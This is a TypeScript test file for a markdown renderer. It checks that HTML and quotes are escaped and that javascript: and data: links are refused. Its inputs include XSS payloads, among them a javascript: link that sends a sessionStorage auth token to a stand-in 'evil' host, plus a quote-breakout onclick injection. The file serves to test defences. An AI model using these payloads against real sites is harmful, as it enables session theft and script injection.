// Markdown renderer smoke tests (legacy renderMarkdown parity): the
// escape-first contract is the security-critical part.
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../markdown";

describe("renderMarkdown", () => {
  it("escapes HTML before introducing markup", () => {
    const html = renderMarkdown("<script>alert('x')</script>");
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes quotes so attribute contexts cannot be broken out of", () => {
    const html = renderMarkdown('say "hi" it\'s fine');
    expect(html).not.toContain('"hi"');
    expect(html).toContain("&quot;hi&quot;");
    expect(html).toContain("&#39;");
  });

  it("renders bold and inline code", () => {
    const html = renderMarkdown("**bold** and `code`");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code>code</code>");
  });

  it("renders fenced code blocks", () => {
    const html = renderMarkdown("```bash\nkubectl get pods\n```");
    expect(html).toContain('<pre><code class="lang-bash">kubectl get pods</code></pre>');
  });

  it("adds rel=noreferrer to links", () => {
    const html = renderMarkdown("[docs](https://example.com)");
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('href="https://example.com"');
  });

  it("refuses javascript: links (rendered as plain text)", () => {
    // Walkthrough-review finding: a javascript: URL with no parentheses
    // passes the link capture and could exfiltrate sessionStorage tokens.
    const html = renderMarkdown(
      "[run](javascript:location='https://evil/?t='+sessionStorage['luban.portal.authSession'])",
    );
    expect(html).not.toContain("href=");
    expect(html).toContain("run");
  });

  it("refuses data: links (rendered as plain text)", () => {
    const html = renderMarkdown("[x](data:text/html,<script>alert(1)</script>)");
    expect(html).not.toContain("href=");
  });

  it("neutralizes quote-based attribute breakout inside link targets", () => {
    const html = renderMarkdown('[x](https://a" onclick="alert(1))');
    expect(html).not.toContain(' onclick="alert(1)');
    // The double quote lands inside the attribute as &quot;.
    expect(html).toContain("https://a&quot;");
  });

  it("returns empty string for empty input", () => {
    expect(renderMarkdown("")).toBe("");
  });
});
